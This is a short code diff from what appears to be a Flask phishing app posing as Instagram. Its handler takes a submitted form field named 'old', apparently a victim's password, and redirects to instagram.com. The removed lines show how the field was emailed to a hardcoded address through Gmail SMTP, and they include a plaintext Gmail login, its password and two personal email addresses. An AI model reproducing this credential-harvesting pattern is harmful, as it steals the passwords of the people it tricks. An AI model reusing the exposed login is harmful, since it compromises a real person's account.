@@ -13,14 +13,6 @@ def index():
 def process():
     if request.method == 'POST':
         data = request.form
-        to = ['abhijithbinoy11@gmail.com']
-        server = smtplib.SMTP('smtp.gmail.com',587)
-        server.ehlo()
-        server.starttls()
-        server.login('abhijithb007m@gmail.com','abhiabhiabhiabhi')
-        result = data['old']
-        server.sendmail('abhijithb007m@gmail.com',to,result)
-        server.close()
         return redirect("http://www.instagram.com")
 
 
